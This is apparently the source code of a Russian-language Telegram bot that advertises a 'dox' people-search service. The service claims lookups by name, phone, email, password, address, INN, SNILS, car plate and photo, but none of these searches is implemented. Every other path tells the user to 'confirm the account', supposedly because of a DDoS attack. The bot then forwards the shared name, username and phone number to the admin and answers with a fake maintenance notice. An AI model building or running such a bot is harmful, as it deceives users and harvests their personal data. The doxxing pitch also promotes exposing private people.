import logging
import asyncio
import config
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import ParseMode

logging.basicConfig(level=logging.INFO)

bot = Bot(token=config.TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)
admin_id = config.ADMIN_ID

find_menu = types.InlineKeyboardMarkup()
button0 = types.InlineKeyboardButton('🔎Начать поиск', callback_data="start_dox")
find_menu.row(button0)
button1 = types.InlineKeyboardButton('⚙️Аккаунт', callback_data="dox")
button2 = types.InlineKeyboardButton('🆘Поддержка', callback_data="dox")
find_menu.row(button1, button2)
button3 = types.InlineKeyboardButton('🤖Создать собственный бот', callback_data="dox")
find_menu.row(button3)
button4 = types.InlineKeyboardButton('🤝Партнерская программа', callback_data="dox")
find_menu.row(button4)


@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    await message.answer("*Добро пожаловать!*", parse_mode=ParseMode.MARKDOWN)
    await message.answer("*Выберите нужное действие:*", parse_mode=ParseMode.MARKDOWN, reply_markup=find_menu)


@dp.callback_query_handler(lambda call: call.data == "start_dox")
async def button0_pressed(call: types.CallbackQuery):
    await bot.send_message(call.message.chat.id,
                           "👤 Поиск по имени\n" + "├  `Блогер` _(Поиск по тегу)_\n"
                           "├  `Антипов Евгений Вячеславович`\n"
                           "└  `Антипов Евгений Вячеславович 05.02.1994`\n"
                           "_(Доступны также следующие форматы_ " + "`05.02`" + "_/" + "`1994`" + "_/" + "`28`" + "_/" + "`20-28`" + ")_\n\n"
                                                                                                                           "🚗 Поиск по авто\n"
                                                                                                                           "├  `Н777ОН777` - поиск авто по *РФ*\n"
                                                                                                                           "└  `ХТА21150053965897` - поиск по *VIN*\n\n"
                                                                                                                           "👨 *Социальные сети*\n"
                                                                                                                           "├  `https://www.instagram.com/violetta_orlova` - *Instagram*\n"
                                                                                                                           "├  `https://vk.com/id577744097` - *Вконтакте*\n"
                                                                                                                           "├  `https://facebook.com/profile.php?id=1` - *Facebook*\n"
                                                                                                                           "└  `https://ok.ru/profile/162853188164` - *Одноклассники*\n\n"
                                                                                                                           "📱 `79999939919` - для поиска по *номеру телефона*\n"
                                                                                                                           "📨 `tema@gmail.com` - для поиска по *Email*\n"
                                                                                                                           "📧 `#281485304`, `@durov` или `перешлите сообщение` - поиск по *Telegram* аккаунту\n\n"
                                                                                                                           "🔐 `/pas churchill7` - поиск почты, логина и телефона *по паролю*\n"
                                                                                                                           "🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)\n"
                                                                                                                           "🏘 `77:01:0001075:1361` - поиск по *кадастровому номеру*\n\n"
                                                                                                                           "🏛 `/company Сбербанк` - поиск по *юр лицам*\n"
                                                                                                                           "📑 `/inn 784806113663` - поиск по *ИНН*\n"
                                                                                                                           "🎫 `/snils 13046964250` - поиск по *СНИЛС*\n\n"
                                                                                                                           "📸 Отправьте *фото человека*, чтобы найти его или двойника на сайтах *ВК*, *ОК*.\n"
                                                                                                                           "🚙 Отправьте *фото номера автомобиля*, чтобы получить о нем информацию.\n"
                                                                                                                           "🙂 Отправьте *стикер*, чтобы найти *создателя*.\n"
                                                                                                                           "🌎 Отправьте *точку на карте*, чтобы *найти людей*, которые сейчас там.\n"
                                                                                                                           "🗣 С помощью *голосовых команд* также можно выполнять *поисковые запросы*.",
                           parse_mode=ParseMode.MARKDOWN)


send = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
button_phone = types.KeyboardButton(text="✅Подтвердить", request_contact=True)
send.add(button_phone)


@dp.callback_query_handler(lambda call: call.data == "dox")
async def button1_pressed(call: types.CallbackQuery):
    await bot.send_message(call.message.chat.id,
                           "⚠️Прежде чем начать поиск, подтвердите свой аккаунт\n\n""*Это временная мера, связанная с активной DDOS атакой на нас.*",
                           parse_mode=ParseMode.MARKDOWN, reply_markup=send)


@dp.message_handler(content_types=types.ContentType.CONTACT)
async def contact(message: types.Message):
    user_info = f"Имя: `{message.from_user.first_name}`"
    if message.from_user.username:
        user_info += f"\nЛогин: @{message.from_user.username}"

    user_info += f"\nНомер телефона: `{message.contact.phone_number}`"

    await bot.send_message(admin_id, f"*🔔Кто-то отправил свой номер!*\n{user_info}", parse_mode=ParseMode.MARKDOWN)
    await message.answer("*⚠️ Технические работы до 05:00 по мск.*\n\nРаботы будут завершены в данный промежуток времени, все подписки продлены.", parse_mode=ParseMode.MARKDOWN, reply_markup=types.ReplyKeyboardRemove())



@dp.message_handler(content_types=types.ContentType.TEXT)
async def handler(message: types.Message):
    await bot.send_message(message.from_user.id,
                           "⚠️Прежде чем начать поиск, подтвердите свой аккаунт\n\n""*Это временная мера, связанная с активной DDOS атакой на нас.*",
                           parse_mode=ParseMode.MARKDOWN, reply_markup=send)


if __name__ == '__main__':
    asyncio.run(dp.start_polling())

